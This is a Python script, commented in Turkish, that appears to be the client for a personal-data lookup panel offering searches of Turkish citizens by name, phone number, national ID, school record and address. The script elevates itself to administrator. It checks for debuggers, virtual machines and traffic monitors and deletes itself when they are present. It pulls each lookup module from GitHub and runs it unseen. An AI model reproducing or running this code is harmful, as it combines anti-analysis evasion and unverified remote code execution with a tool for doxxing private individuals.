import os
import webbrowser
import winreg
import os.path
import psutil
import sys
import ctypes
import requests
import subprocess
import urllib.request
import time



url = "https://raw.githubusercontent.com/Codexecuters/12390sadm1l2da.sdo109msip-dm1-23.as.d/main/Ex_Check.py"
filename = "Ex_Check.py"

def check_file():
    print("Kodun guncel olup olunmadigi kontrol ediliyor..")
    urllib.request.urlretrieve(url, "temp")
    if not os.path.exists(filename):
        return True
    else:
        with open("temp", "r") as f1, open(filename, "r") as f2:
            if f1.read() == f2.read():
                return False
            else:
                return True
    os.remove("temp")



def update_file():
    print("Kod guncelleniyor..")
    urllib.request.urlretrieve(url, filename)


if check_file():
    update_file()
    print("Kod Guncel")
    time.sleep(3)

def run_as_admin(argv=None, debug=False):
    if argv is None:
        argv = sys.argv
    if hasattr(sys, '_MEIPASS'):
        # PyInstaller ile paketlenmiş bir uygulama olarak çalıştırılıyorsa,
        # çalıştırılacak dosyaların yolunu değiştirin.
        exe_file = os.path.join(sys._MEIPASS, argv[0])
    else:
        exe_file = argv[0]
    params = ' '.join([f'"{x}"' for x in argv[1:]])
    cmd = f'"{exe_file}" {params}'
    if debug:
        print(cmd)
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, cmd, None, 1)

if not ctypes.windll.shell32.IsUserAnAdmin():
    run_as_admin()
    sys.exit(0)

# HWID'yi kayıt defterinden al ve ekrana yazdır
def get_hwid():
    try:
        registry_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion")
        hwid, _ = winreg.QueryValueEx(registry_key, "ProductId")
        winreg.CloseKey(registry_key)
        return hwid
    except WindowsError:
        return "HWID not found"

program_blacklist = [
    "httpdebuggerui.exe", 
    "wireshark.exe", 
    "HTTPDebuggerSvc.exe", 
    "fiddler.exe", 
    "regedit.exe", 
    "taskmgr.exe", 
    "vboxservice.exe", 
    "df5serv.exe", 
    "processhacker.exe", 
    "vboxtray.exe", 
    "vmtoolsd.exe", 
    "vmwaretray.exe", 
    "ida64.exe", 
    "ollydbg.exe",
    "pestudio.exe", 
    "vmwareuser", 
    "vgauthservice.exe", 
    "vmacthlp.exe", 
    "x96dbg.exe", 
    "vmsrvc.exe", 
    "dnspy.exe",
    "x32dbg.exe", 
    "vmusrvc.exe", 
    "prl_cc.exe", 
    "prl_tools.exe", 
    "xenservice.exe", 
    "qemu-ga.exe", 
    "joeboxcontrol.exe", 
    "ksdumperclient.exe", 
    "ksdumper.exe",
    "joeboxserver.exe"
]

# Tarayıcıyı açık mı diye kontrol et ve program_blacklist listesindeki uygulamaları da kontrol et
if any(p.name() in program_blacklist for p in psutil.process_iter()):
    # banned.txt dosyasını oluştur
    with open("C:\\Windows\Setup\\State\\banned.txt", "w") as f:
        # HWID'yi dosyaya yazdır
        f.write(get_hwid())

# banned.txt dosyasının varlığını kontrol et
if os.path.isfile("C:\\Windows\Setup\\State\\banned.txt"):
    # banned.txt dosyası varsa, kodun kendisini sil
    os.remove(__file__)
    
while True:
    
    url = "https://raw.githubusercontent.com/Codexecuters/12390sadm1l2da.sdo109msip-dm1-23.as.d/main/"
    
    if os.path.isfile("C:\\Windows\Setup\\State\\banned.txt"):
        print("Bani Yemissin Kafanaa KANKAA :D")
    else:
        print("Your HWID:", get_hwid())
        print("1 - Ad Soyad Sorgu")
        print("2 - GSM Sorgu")
        print("3 - TC Sorgu")
        print("4 - Eokul Sorgu")
        print("5 - Gsm Tc Sorgu")
        print("6 - Adres Sorgu")       
        print("7 - Discord")
        print("8 - Youtube")
        secim = input("Seciminiz: ")

        if secim == "1":
            response = requests.get(url + "adsoyad.py")
            subprocess.run(["python", "-c", response.text])
        elif secim == "2":
            response = requests.get(url + "gsm.py")
            subprocess.run(["python", "-c", response.text])
        elif secim == "3":
            response = requests.get(url + "tc.py")
            subprocess.run(["python", "-c", response.text])
        elif secim == "4":
            response = requests.get(url + "eokul.py")
            subprocess.run(["python", "-c", response.text])
        elif secim == "5":
            response = requests.get(url + "gsmtc.py")
            subprocess.run(["python", "-c", response.text])
        elif secim == "7":
            webbrowser.open("https://discord.gg/apexcode")
        elif secim == "6":
            response = requests.get(url + "adres.py")
            subprocess.run(["python", "-c", response.text])
        elif secim == "8":
            webbrowser.open("https://discord.gg/apexcode")
        else:
            print("Hatalı seçim.")
